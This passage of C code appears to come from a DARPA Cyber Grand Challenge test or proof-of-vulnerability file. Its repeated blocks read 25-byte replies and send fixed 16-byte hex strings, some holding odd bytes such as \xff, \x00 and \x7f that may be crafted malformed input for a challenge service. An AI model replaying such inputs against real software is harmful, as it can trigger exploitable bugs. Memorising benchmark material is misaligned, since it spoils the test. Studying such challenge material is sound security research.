      read_00130 = (unsigned char*)cgc_malloc(read_00130_len);
      int read_00130_res = cgc_length_read(0, read_00130, read_00130_len);
      if (read_00130_res) {} //silence unused variable warning
      cgc_free(read_00130);
      if (read_00130_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00130_00000[] = 
         "\x50\x67\x4f\x59\x6a\x48\x42\x71\x62\x59\x53\x6e\x4a\x42\x4a\x5a";
      static unsigned int write_00130_00000_len = 16;
      unsigned char *write_00130 = NULL;
      unsigned int write_00130_len = 0;
      write_00130 = cgc_append_buf(write_00130, &write_00130_len, write_00130_00000, write_00130_00000_len);
      if (write_00130_len > 0) {
         cgc_transmit_all(1, write_00130, write_00130_len);
      }
      cgc_free(write_00130);
   } while (0);
   do {
      unsigned char *read_00131;
      unsigned int read_00131_len;
      unsigned int read_00131_ptr = 0;
      //**** length read
      read_00131_len = 25;
      read_00131 = (unsigned char*)cgc_malloc(read_00131_len);
      int read_00131_res = cgc_length_read(0, read_00131, read_00131_len);
      if (read_00131_res) {} //silence unused variable warning
      cgc_free(read_00131);
      if (read_00131_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00131_00000[] = 
         "\x59\x6c\x4e\x72\x50\x69\x56\x42\x73\x41\x68\x4e\x4e\x56\x6c\x5a";
      static unsigned int write_00131_00000_len = 16;
      unsigned char *write_00131 = NULL;
      unsigned int write_00131_len = 0;
      write_00131 = cgc_append_buf(write_00131, &write_00131_len, write_00131_00000, write_00131_00000_len);
      if (write_00131_len > 0) {
         cgc_transmit_all(1, write_00131, write_00131_len);
      }
      cgc_free(write_00131);
   } while (0);
   do {
      unsigned char *read_00132;
      unsigned int read_00132_len;
      unsigned int read_00132_ptr = 0;
      //**** length read
      read_00132_len = 25;
      read_00132 = (unsigned char*)cgc_malloc(read_00132_len);
      int read_00132_res = cgc_length_read(0, read_00132, read_00132_len);
      if (read_00132_res) {} //silence unused variable warning
      cgc_free(read_00132);
      if (read_00132_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00132_00000[] = 
         "\x78\x6d\xff\xff\x00\x00\x46\x63\x4c\x79\x4f\x65\x63\x4b\x70\x74";
      static unsigned int write_00132_00000_len = 16;
      unsigned char *write_00132 = NULL;
      unsigned int write_00132_len = 0;
      write_00132 = cgc_append_buf(write_00132, &write_00132_len, write_00132_00000, write_00132_00000_len);
      if (write_00132_len > 0) {
         cgc_transmit_all(1, write_00132, write_00132_len);
      }
      cgc_free(write_00132);
   } while (0);
   do {
      unsigned char *read_00133;
      unsigned int read_00133_len;
      unsigned int read_00133_ptr = 0;
      //**** length read
      read_00133_len = 25;
      read_00133 = (unsigned char*)cgc_malloc(read_00133_len);
      int read_00133_res = cgc_length_read(0, read_00133, read_00133_len);
      if (read_00133_res) {} //silence unused variable warning
      cgc_free(read_00133);
      if (read_00133_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00133_00000[] = 
         "\x58\x58\x61\x4f\x49\x51\x74\x79\x62\x22\x7d\x2c\x20\x22\x53\x77";
      static unsigned int write_00133_00000_len = 16;
      unsigned char *write_00133 = NULL;
      unsigned int write_00133_len = 0;
      write_00133 = cgc_append_buf(write_00133, &write_00133_len, write_00133_00000, write_00133_00000_len);
      if (write_00133_len > 0) {
         cgc_transmit_all(1, write_00133, write_00133_len);
      }
      cgc_free(write_00133);
   } while (0);
   do {
      unsigned char *read_00134;
      unsigned int read_00134_len;
      unsigned int read_00134_ptr = 0;
      //**** length read
      read_00134_len = 25;
      read_00134 = (unsigned char*)cgc_malloc(read_00134_len);
      int read_00134_res = cgc_length_read(0, read_00134, read_00134_len);
      if (read_00134_res) {} //silence unused variable warning
      cgc_free(read_00134);
      if (read_00134_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00134_00000[] = 
         "\x6f\x68\x41\x4e\x6e\x69\x53\x7a\x69\x64\xff\x7f\x7a\x59\x4c\x44";
      static unsigned int write_00134_00000_len = 16;
      unsigned char *write_00134 = NULL;
      unsigned int write_00134_len = 0;
      write_00134 = cgc_append_buf(write_00134, &write_00134_len, write_00134_00000, write_00134_00000_len);
      if (write_00134_len > 0) {
         cgc_transmit_all(1, write_00134, write_00134_len);
      }
      cgc_free(write_00134);
   } while (0);
   do {
      unsigned char *read_00135;
      unsigned int read_00135_len;
      unsigned int read_00135_ptr = 0;
      //**** length read
      read_00135_len = 25;
      read_00135 = (unsigned char*)cgc_malloc(read_00135_len);
      int read_00135_res = cgc_length_read(0, read_00135, read_00135_len);
      if (read_00135_res) {} //silence unused variable warning
      cgc_free(read_00135);
      if (read_00135_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00135_00000[] = 
         "\x6c\x44\x73\x6c\x48\x05\xff\xff\x05\x4c\x76\x78\x66\x78\x78\x49";
      static unsigned int write_00135_00000_len = 16;
      unsigned char *write_00135 = NULL;
      unsigned int write_00135_len = 0;
      write_00135 = cgc_append_buf(write_00135, &write_00135_len, write_00135_00000, write_00135_00000_len);
      if (write_00135_len > 0) {
         cgc_transmit_all(1, write_00135, write_00135_len);
      }
      cgc_free(write_00135);
   } while (0);
   do {
      unsigned char *read_00136;
      unsigned int read_00136_len;
      unsigned int read_00136_ptr = 0;
      //**** length read
      read_00136_len = 25;
      read_00136 = (unsigned char*)cgc_malloc(read_00136_len);
      int read_00136_res = cgc_length_read(0, read_00136, read_00136_len);
      if (read_00136_res) {} //silence unused variable warning
      cgc_free(read_00136);
      if (read_00136_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00136_00000[] = 
         "\x74\x50\x76\x71\x51\x66\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x22";
      static unsigned int write_00136_00000_len = 16;
      unsigned char *write_00136 = NULL;
      unsigned int write_00136_len = 0;
      write_00136 = cgc_append_buf(write_00136, &write_00136_len, write_00136_00000, write_00136_00000_len);
      if (write_00136_len > 0) {
         cgc_transmit_all(1, write_00136, write_00136_len);
      }
      cgc_free(write_00136);
   } while (0);
   do {
      unsigned char *read_00137;
      unsigned int read_00137_len;
      unsigned int read_00137_ptr = 0;
      //**** length read
      read_00137_len = 25;
      read_00137 = (unsigned char*)cgc_malloc(read_00137_len);
      int read_00137_res = cgc_length_read(0, read_00137, read_00137_len);
      if (read_00137_res) {} //silence unused variable warning
      cgc_free(read_00137);
      if (read_00137_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00137_00000[] = 
         "\x53\x56\x71\x63\x56\x6b\x67\x68\x53\x47\x67\x76\x46\x52\x59\x51";
      static unsigned int write_00137_00000_len = 16;
      unsigned char *write_00137 = NULL;
      unsigned int write_00137_len = 0;
      write_00137 = cgc_append_buf(write_00137, &write_00137_len, write_00137_00000, write_00137_00000_len);
      if (write_00137_len > 0) {
         cgc_transmit_all(1, write_00137, write_00137_len);
      }
      cgc_free(write_00137);
   } while (0);
   do {
      unsigned char *read_00138;
      unsigned int read_00138_len;
      unsigned int read_00138_ptr = 0;
      //**** length read
      read_00138_len = 25;
      read_00138 = (unsigned char*)cgc_malloc(read_00138_len);
      int read_00138_res = cgc_length_read(0, read_00138, read_00138_len);
      if (read_00138_res) {} //silence unused variable warning
      cgc_free(read_00138);
      if (read_00138_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00138_00000[] = 
         "\x52\x57\x6d\x6a\x66\x79\x42\x70\x64\x54\x52\x6d\x6d\x42\x4b\x62";
      static unsigned int write_00138_00000_len = 16;
      unsigned char *write_00138 = NULL;
      unsigned int write_00138_len = 0;
      write_00138 = cgc_append_buf(write_00138, &write_00138_len, write_00138_00000, write_00138_00000_len);
      if (write_00138_len > 0) {
         cgc_transmit_all(1, write_00138, write_00138_len);
      }
      cgc_free(write_00138);
   } while (0);
   do {
      unsigned char *read_00139;
      unsigned int read_00139_len;
      unsigned int read_00139_ptr = 0;
      //**** length read
      read_00139_len = 25;
      read_00139 = (unsigned char*)cgc_malloc(read_00139_len);
      int read_00139_res = cgc_length_read(0, read_00139, read_00139_len);
      if (read_00139_res) {} //silence unused variable warning
      cgc_free(read_00139);
      if (read_00139_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00139_00000[] = 
         "\x75\x4a\x67\x55\x22\x3a\x20\x22\x70\x54\x79\x65\x63\x49\x41\x70";
      static unsigned int write_00139_00000_len = 16;
      unsigned char *write_00139 = NULL;
      unsigned int write_00139_len = 0;
      write_00139 = cgc_append_buf(write_00139, &write_00139_len, write_00139_00000, write_00139_00000_len);
      if (write_00139_len > 0) {
         cgc_transmit_all(1, write_00139, write_00139_len);
      }
      cgc_free(write_00139);
   } while (0);
   do {
      unsigned char *read_00140;
      unsigned int read_00140_len;
      unsigned int read_00140_ptr = 0;
      //**** length read
      read_00140_len = 25;
      read_00140 = (unsigned char*)cgc_malloc(read_00140_len);
      int read_00140_res = cgc_length_read(0, read_00140, read_00140_len);
      if (read_00140_res) {} //silence unused variable warning
      cgc_free(read_00140);
      if (read_00140_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00140_00000[] = 
         "\x42\x53\x51\x53\x54\x79\x42\x49\x54\x4d\x22\x2c\x20\x22\x4a\x47";
      static unsigned int write_00140_00000_len = 16;
      unsigned char *write_00140 = NULL;
      unsigned int write_00140_len = 0;
      write_00140 = cgc_append_buf(write_00140, &write_00140_len, write_00140_00000, write_00140_00000_len);
      if (write_00140_len > 0) {
         cgc_transmit_all(1, write_00140, write_00140_len);
      }
      cgc_free(write_00140);
   } while (0);
   do {
      unsigned char *read_00141;
      unsigned int read_00141_len;
      unsigned int read_00141_ptr = 0;
      //**** length read
      read_00141_len = 25;
      read_00141 = (unsigned char*)cgc_malloc(read_00141_len);
      int read_00141_res = cgc_length_read(0, read_00141, read_00141_len);
      if (read_00141_res) {} //silence unused variable warning
      cgc_free(read_00141);
      if (read_00141_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00141_00000[] = 
         "\x66\x53\x62\x6d\x51\x56\x6d\x63\x54\x59\x54\x4b\x66\x41\x6a\x6c";
      static unsigned int write_00141_00000_len = 16;
      unsigned char *write_00141 = NULL;
      unsigned int write_00141_len = 0;
      write_00141 = cgc_append_buf(write_00141, &write_00141_len, write_00141_00000, write_00141_00000_len);
      if (write_00141_len > 0) {
         cgc_transmit_all(1, write_00141, write_00141_len);
      }
      cgc_free(write_00141);
   } while (0);
   do {
      unsigned char *read_00142;
      unsigned int read_00142_len;
      unsigned int read_00142_ptr = 0;
      //**** length read
      read_00142_len = 25;
      read_00142 = (unsigned char*)cgc_malloc(read_00142_len);
      int read_00142_res = cgc_length_read(0, read_00142, read_00142_len);
      if (read_00142_res) {} //silence unused variable warning
      cgc_free(read_00142);
      if (read_00142_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00142_00000[] = 
         "\x6b\x7f\xff\xff\xff\x57\x62\x67\x52\x45\x4e\x4f\x45\x68\x43\x6f";
      static unsigned int write_00142_00000_len = 16;
      unsigned char *write_00142 = NULL;
      unsigned int write_00142_len = 0;
      write_00142 = cgc_append_buf(write_00142, &write_00142_len, write_00142_00000, write_00142_00000_len);
      if (write_00142_len > 0) {
         cgc_transmit_all(1, write_00142, write_00142_len);
      }
      cgc_free(write_00142);
   } while (0);
   do {
      unsigned char *read_00143;
      unsigned int read_00143_len;
      unsigned int read_00143_ptr = 0;
      //**** length read
      read_00143_len = 25;
      read_00143 = (unsigned char*)cgc_malloc(read_00143_len);
      int read_00143_res = cgc_length_read(0, read_00143, read_00143_len);
      if (read_00143_res) {} //silence unused variable warning
      cgc_free(read_00143);
      if (read_00143_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00143_00000[] = 
         "\x4e\x69\x5a\x43\x41\x72\x4f\x69\x72\x48\x78\x50\x53\x70\x42\x4b";
      static unsigned int write_00143_00000_len = 16;
      unsigned char *write_00143 = NULL;
      unsigned int write_00143_len = 0;
      write_00143 = cgc_append_buf(write_00143, &write_00143_len, write_00143_00000, write_00143_00000_len);
      if (write_00143_len > 0) {
         cgc_transmit_all(1, write_00143, write_00143_len);
      }
      cgc_free(write_00143);
   } while (0);
   do {
      unsigned char *read_00144;
      unsigned int read_00144_len;
      unsigned int read_00144_ptr = 0;
      //**** length read
      read_00144_len = 25;
      read_00144 = (unsigned char*)cgc_malloc(read_00144_len);
      int read_00144_res = cgc_length_read(0, read_00144, read_00144_len);
      if (read_00144_res) {} //silence unused variable warning
      cgc_free(read_00144);
      if (read_00144_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00144_00000[] = 
         "\x7a\x4c\x6f\x6a\x50\x71\x62\x66\x7a\x53\x52\x63\x42\x56\x57\x44";
      static unsigned int write_00144_00000_len = 16;
      unsigned char *write_00144 = NULL;
      unsigned int write_00144_len = 0;
      write_00144 = cgc_append_buf(write_00144, &write_00144_len, write_00144_00000, write_00144_00000_len);
      if (write_00144_len > 0) {
         cgc_transmit_all(1, write_00144, write_00144_len);
      }
      cgc_free(write_00144);
   } while (0);
   do {
      unsigned char *read_00145;
      unsigned int read_00145_len;
      unsigned int read_00145_ptr = 0;
      //**** length read
      read_00145_len = 25;
      read_00145 = (unsigned char*)cgc_malloc(read_00145_len);
      int read_00145_res = cgc_length_read(0, read_00145, read_00145_len);
      if (read_00145_res) {} //silence unused variable warning
      cgc_free(read_00145);
      if (read_00145_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00145_00000[] = 
         "\x55\x43\x43\x58\x57\x22\x3a\x20\x22\x71\x6e\x6d\x66\x64\x72\x71";
      static unsigned int write_00145_00000_len = 16;
      unsigned char *write_00145 = NULL;
      unsigned int write_00145_len = 0;
      write_00145 = cgc_append_buf(write_00145, &write_00145_len, write_00145_00000, write_00145_00000_len);
      if (write_00145_len > 0) {
         cgc_transmit_all(1, write_00145, write_00145_len);
      }
      cgc_free(write_00145);
   } while (0);
   do {
      unsigned char *read_00146;
      unsigned int read_00146_len;
      unsigned int read_00146_ptr = 0;
      //**** length read
      read_00146_len = 25;
      read_00146 = (unsigned char*)cgc_malloc(read_00146_len);
      int read_00146_res = cgc_length_read(0, read_00146, read_00146_len);
      if (read_00146_res) {} //silence unused variable warning
      cgc_free(read_00146);
      if (read_00146_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00146_00000[] = 
         "\x48\x43\x70\x78\x55\x22\x00\xff\xff\x41\x76\x55\x47\x53\x41\x4e";
      static unsigned int write_00146_00000_len = 16;
      unsigned char *write_00146 = NULL;
      unsigned int write_00146_len = 0;
      write_00146 = cgc_append_buf(write_00146, &write_00146_len, write_00146_00000, write_00146_00000_len);
      if (write_00146_len > 0) {
         cgc_transmit_all(1, write_00146, write_00146_len);
      }
      cgc_free(write_00146);
   } while (0);
   do {
      unsigned char *read_00147;
      unsigned int read_00147_len;
      unsigned int read_00147_ptr = 0;
      //**** length read
      read_00147_len = 25;
      read_00147 = (unsigned char*)cgc_malloc(read_00147_len);
      int read_00147_res = cgc_length_read(0, read_00147, read_00147_len);
      if (read_00147_res) {} //silence unused variable warning
      cgc_free(read_00147);
      if (read_00147_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00147_00000[] = 
         "\x77\x6e\x6d\x58\x6f\x5a\x46\x6e\x71\x4b\x68\x6e\x54\x67\x7a\x42";
      static unsigned int write_00147_00000_len = 16;
      unsigned char *write_00147 = NULL;
      unsigned int write_00147_len = 0;
      write_00147 = cgc_append_buf(write_00147, &write_00147_len, write_00147_00000, write_00147_00000_len);
      if (write_00147_len > 0) {
         cgc_transmit_all(1, write_00147, write_00147_len);
      }
      cgc_free(write_00147);
   } while (0);
   do {
      unsigned char *read_00148;
      unsigned int read_00148_len;
      unsigned int read_00148_ptr = 0;
      //**** length read
      read_00148_len = 25;
      read_00148 = (unsigned char*)cgc_malloc(read_00148_len);
      int read_00148_res = cgc_length_read(0, read_00148, read_00148_len);
      if (read_00148_res) {} //silence unused variable warning
      cgc_free(read_00148);
      if (read_00148_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00148_00000[] = 
         "\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x22\x4a\x7a\x41\x69\x57\x77";
      static unsigned int write_00148_00000_len = 16;
      unsigned char *write_00148 = NULL;
      unsigned int write_00148_len = 0;
      write_00148 = cgc_append_buf(write_00148, &write_00148_len, write_00148_00000, write_00148_00000_len);
      if (write_00148_len > 0) {
         cgc_transmit_all(1, write_00148, write_00148_len);
      }
      cgc_free(write_00148);
   } while (0);
   do {
      unsigned char *read_00149;
      unsigned int read_00149_len;
      unsigned int read_00149_ptr = 0;
      //**** length read
      read_00149_len = 25;
      read_00149 = (unsigned char*)cgc_malloc(read_00149_len);
      int read_00149_res = cgc_length_read(0, read_00149, read_00149_len);
      if (read_00149_res) {} //silence unused variable warning
      cgc_free(read_00149);
      if (read_00149_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00149_00000[] = 
         "\x58\x78\x44\x47\x66\x62\x44\x77\x44\x58\x72\x58\x4f\x77\x74\x7a";
      static unsigned int write_00149_00000_len = 16;
      unsigned char *write_00149 = NULL;
      unsigned int write_00149_len = 0;
      write_00149 = cgc_append_buf(write_00149, &write_00149_len, write_00149_00000, write_00149_00000_len);
      if (write_00149_len > 0) {
         cgc_transmit_all(1, write_00149, write_00149_len);
      }
      cgc_free(write_00149);
   } while (0);
   do {
      unsigned char *read_00150;
      unsigned int read_00150_len;
      unsigned int read_00150_ptr = 0;
      //**** length read
      read_00150_len = 25;
      read_00150 = (unsigned char*)cgc_malloc(read_00150_len);
      int read_00150_res = cgc_length_read(0, read_00150, read_00150_len);
      if (read_00150_res) {} //silence unused variable warning
      cgc_free(read_00150);
      if (read_00150_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00150_00000[] = 
         "\x7a\x6b\x66\x45\x52\x74\x54\x59\x67\x52\x41\x71\x5a\x57\x77\x74";
      static unsigned int write_00150_00000_len = 16;
      unsigned char *write_00150 = NULL;
      unsigned int write_00150_len = 0;
      write_00150 = cgc_append_buf(write_00150, &write_00150_len, write_00150_00000, write_00150_00000_len);
      if (write_00150_len > 0) {
         cgc_transmit_all(1, write_00150, write_00150_len);
      }
      cgc_free(write_00150);
   } while (0);
   do {
      unsigned char *read_00151;
      unsigned int read_00151_len;
      unsigned int read_00151_ptr = 0;
      //**** length read
      read_00151_len = 25;
      read_00151 = (unsigned char*)cgc_malloc(read_00151_len);
      int read_00151_res = cgc_length_read(0, read_00151, read_00151_len);
      if (read_00151_res) {} //silence unused variable warning
      cgc_free(read_00151);
      if (read_00151_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00151_00000[] = 
         "\x49\x6e\x67\x58\x59\x4b\x52\x49\x66\x69\x4a\x4b\x4e\x22\x3a\x20";
      static unsigned int write_00151_00000_len = 16;
      unsigned char *write_00151 = NULL;
      unsigned int write_00151_len = 0;
      write_00151 = cgc_append_buf(write_00151, &write_00151_len, write_00151_00000, write_00151_00000_len);
      if (write_00151_len > 0) {
         cgc_transmit_all(1, write_00151, write_00151_len);
      }
      cgc_free(write_00151);
   } while (0);
   do {
      unsigned char *read_00152;
      unsigned int read_00152_len;
      unsigned int read_00152_ptr = 0;
      //**** length read
      read_00152_len = 25;
      read_00152 = (unsigned char*)cgc_malloc(read_00152_len);
      int read_00152_res = cgc_length_read(0, read_00152, read_00152_len);
      if (read_00152_res) {} //silence unused variable warning
      cgc_free(read_00152);
      if (read_00152_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00152_00000[] = 
         "\x22\x6e\x73\x68\x41\x6e\x61\x49\x57\x4e\x6b\x50\x4f\x6b\x4e\x62";
      static unsigned int write_00152_00000_len = 16;
      unsigned char *write_00152 = NULL;
      unsigned int write_00152_len = 0;
      write_00152 = cgc_append_buf(write_00152, &write_00152_len, write_00152_00000, write_00152_00000_len);
      if (write_00152_len > 0) {
         cgc_transmit_all(1, write_00152, write_00152_len);
      }
      cgc_free(write_00152);
   } while (0);
   do {
      unsigned char *read_00153;
      unsigned int read_00153_len;
      unsigned int read_00153_ptr = 0;
      //**** length read
      read_00153_len = 25;
      read_00153 = (unsigned char*)cgc_malloc(read_00153_len);
      int read_00153_res = cgc_length_read(0, read_00153, read_00153_len);
      if (read_00153_res) {} //silence unused variable warning
      cgc_free(read_00153);
      if (read_00153_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00153_00000[] = 
         "\x70\x6a\x79\x5a\x50\x4c\x63\x53\x6c\x22\x79\x2c\x20\x5b\x6e\x75";
      static unsigned int write_00153_00000_len = 16;
      unsigned char *write_00153 = NULL;
      unsigned int write_00153_len = 0;
      write_00153 = cgc_append_buf(write_00153, &write_00153_len, write_00153_00000, write_00153_00000_len);
      if (write_00153_len > 0) {
         cgc_transmit_all(1, write_00153, write_00153_len);
      }
      cgc_free(write_00153);
   } while (0);
   do {
      unsigned char *read_00154;
      unsigned int read_00154_len;
      unsigned int read_00154_ptr = 0;
      //**** length read
      read_00154_len = 25;
      read_00154 = (unsigned char*)cgc_malloc(read_00154_len);
      int read_00154_res = cgc_length_read(0, read_00154, read_00154_len);
      if (read_00154_res) {} //silence unused variable warning
      cgc_free(read_00154);
      if (read_00154_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00154_00000[] = 
         "\x6c\x6c\x5d\x2c\x20\x6e\x75\x6c\x6c\x2c\x20\x2d\x31\x31\x37\x35";
      static unsigned int write_00154_00000_len = 16;
      unsigned char *write_00154 = NULL;
      unsigned int write_00154_len = 0;
      write_00154 = cgc_append_buf(write_00154, &write_00154_len, write_00154_00000, write_00154_00000_len);
      if (write_00154_len > 0) {
         cgc_transmit_all(1, write_00154, write_00154_len);
      }
      cgc_free(write_00154);
   } while (0);
   do {
      unsigned char *read_00155;
      unsigned int read_00155_len;
      unsigned int read_00155_ptr = 0;
      //**** length read
      read_00155_len = 25;
      read_00155 = (unsigned char*)cgc_malloc(read_00155_len);
      int read_00155_res = cgc_length_read(0, read_00155, read_00155_len);
      if (read_00155_res) {} //silence unused variable warning
      cgc_free(read_00155);
      if (read_00155_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00155_00000[] = 
         "\x33\x34\x30\x39\x38\x31\x2c\x20\x22\x7a\x4d\x43\x46\x4f\x4d\x52";
      static unsigned int write_00155_00000_len = 16;
      unsigned char *write_00155 = NULL;
      unsigned int write_00155_len = 0;
      write_00155 = cgc_append_buf(write_00155, &write_00155_len, write_00155_00000, write_00155_00000_len);
      if (write_00155_len > 0) {
         cgc_transmit_all(1, write_00155, write_00155_len);
      }
      cgc_free(write_00155);
   } while (0);
   do {
      unsigned char *read_00156;
      unsigned int read_00156_len;
      unsigned int read_00156_ptr = 0;
      //**** length read
      read_00156_len = 25;
      read_00156 = (unsigned char*)cgc_malloc(read_00156_len);
      int read_00156_res = cgc_length_read(0, read_00156, read_00156_len);
      if (read_00156_res) {} //silence unused variable warning
      cgc_free(read_00156);
      if (read_00156_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00156_00000[] = 
         "\x53\x54\x74\x34\x58\x67\x69\x45\x56\x68\x20\x30\x2e\x33\x32\x2c";
      static unsigned int write_00156_00000_len = 16;
      unsigned char *write_00156 = NULL;
      unsigned int write_00156_len = 0;
      write_00156 = cgc_append_buf(write_00156, &write_00156_len, write_00156_00000, write_00156_00000_len);
      if (write_00156_len > 0) {
         cgc_transmit_all(1, write_00156, write_00156_len);
      }
      cgc_free(write_00156);
   } while (0);
   do {
      unsigned char *read_00157;
      unsigned int read_00157_len;
      unsigned int read_00157_ptr = 0;
      //**** length read
      read_00157_len = 25;
      read_00157 = (unsigned char*)cgc_malloc(read_00157_len);
      int read_00157_res = cgc_length_read(0, read_00157, read_00157_len);
      if (read_00157_res) {} //silence unused variable warning
      cgc_free(read_00157);
      if (read_00157_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00157_00000[] = 
         "\x6a\x71\x65\x47\x22\x4b\x59\x6e\x65\x64\x54\x61\x22\x3a\x20\x22";
      static unsigned int write_00157_00000_len = 16;
      unsigned char *write_00157 = NULL;
      unsigned int write_00157_len = 0;
      write_00157 = cgc_append_buf(write_00157, &write_00157_len, write_00157_00000, write_00157_00000_len);
      if (write_00157_len > 0) {
         cgc_transmit_all(1, write_00157, write_00157_len);
      }
      cgc_free(write_00157);
   } while (0);
   do {
      unsigned char *read_00158;
      unsigned int read_00158_len;
      unsigned int read_00158_ptr = 0;
      //**** length read
      read_00158_len = 25;
      read_00158 = (unsigned char*)cgc_malloc(read_00158_len);
      int read_00158_res = cgc_length_read(0, read_00158, read_00158_len);
      if (read_00158_res) {} //silence unused variable warning
      cgc_free(read_00158);
      if (read_00158_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00158_00000[] = 
         "\x4c\x71\x58\x79\x55\x71\x41\x62\x4b\x62\x43\x51\x45\x74\x59\x49";
      static unsigned int write_00158_00000_len = 16;
      unsigned char *write_00158 = NULL;
      unsigned int write_00158_len = 0;
      write_00158 = cgc_append_buf(write_00158, &write_00158_len, write_00158_00000, write_00158_00000_len);
      if (write_00158_len > 0) {
         cgc_transmit_all(1, write_00158, write_00158_len);
      }
      cgc_free(write_00158);
   } while (0);
   do {
      unsigned char *read_00159;
      unsigned int read_00159_len;
      unsigned int read_00159_ptr = 0;
      //**** length read
      read_00159_len = 25;
      read_00159 = (unsigned char*)cgc_malloc(read_00159_len);
      int read_00159_res = cgc_length_read(0, read_00159, read_00159_len);
      if (read_00159_res) {} //silence unused variable warning
      cgc_free(read_00159);
      if (read_00159_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00159_00000[] = 
         "\x68\x66\x63\x58\x72\x67\x6b\x6a\x74\x61\x73\x4f\x51\x7a\x6f\x6b";
      static unsigned int write_00159_00000_len = 16;
      unsigned char *write_00159 = NULL;
      unsigned int write_00159_len = 0;
      write_00159 = cgc_append_buf(write_00159, &write_00159_len, write_00159_00000, write_00159_00000_len);
      if (write_00159_len > 0) {
         cgc_transmit_all(1, write_00159, write_00159_len);
      }
      cgc_free(write_00159);
   } while (0);
   do {
      unsigned char *read_00160;
      unsigned int read_00160_len;
      unsigned int read_00160_ptr = 0;
      //**** length read
      read_00160_len = 25;
      read_00160 = (unsigned char*)cgc_malloc(read_00160_len);
      int read_00160_res = cgc_length_read(0, read_00160, read_00160_len);
      if (read_00160_res) {} //silence unused variable warning
      cgc_free(read_00160);
      if (read_00160_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00160_00000[] = 
         "\x54\x28\x56\x5a\x6f\x6f\x4e\x63\x55\x47\x73\x6e\x77\x70\x44\x22";
      static unsigned int write_00160_00000_len = 16;
      unsigned char *write_00160 = NULL;
      unsigned int write_00160_len = 0;
      write_00160 = cgc_append_buf(write_00160, &write_00160_len, write_00160_00000, write_00160_00000_len);
      if (write_00160_len > 0) {
         cgc_transmit_all(1, write_00160, write_00160_len);
      }
      cgc_free(write_00160);
   } while (0);
   do {
      unsigned char *read_00161;
      unsigned int read_00161_len;
      unsigned int read_00161_ptr = 0;
      //**** length read
      read_00161_len = 25;
      read_00161 = (unsigned char*)cgc_malloc(read_00161_len);
      int read_00161_res = cgc_length_read(0, read_00161, read_00161_len);
      if (read_00161_res) {} //silence unused variable warning
      cgc_free(read_00161);
      if (read_00161_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00161_00000[] = 
         "\x3a\x20\x66\x61\x6c\x73\x65\x2c\x20\x22\x61\x79\x4c\x6d\x78\x52";
      static unsigned int write_00161_00000_len = 16;
      unsigned char *write_00161 = NULL;
      unsigned int write_00161_len = 0;
      write_00161 = cgc_append_buf(write_00161, &write_00161_len, write_00161_00000, write_00161_00000_len);
      if (write_00161_len > 0) {
         cgc_transmit_all(1, write_00161, write_00161_len);
      }
      cgc_free(write_00161);
   } while (0);
   do {
      unsigned char *read_00162;
      unsigned int read_00162_len;
      unsigned int read_00162_ptr = 0;
      //**** length read
      read_00162_len = 25;
      read_00162 = (unsigned char*)cgc_malloc(read_00162_len);
      int read_00162_res = cgc_length_read(0, read_00162, read_00162_len);
      if (read_00162_res) {} //silence unused variable warning
      cgc_free(read_00162);
      if (read_00162_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00162_00000[] = 
         "\x72\x4a\x6e\x59\x7a\x41\x6a\x77\x73\x55\x74\x4c\x43\x56\x4f\x43";
      static unsigned int write_00162_00000_len = 16;
      unsigned char *write_00162 = NULL;
      unsigned int write_00162_len = 0;
      write_00162 = cgc_append_buf(write_00162, &write_00162_len, write_00162_00000, write_00162_00000_len);
      if (write_00162_len > 0) {
         cgc_transmit_all(1, write_00162, write_00162_len);
      }
      cgc_free(write_00162);
   } while (0);
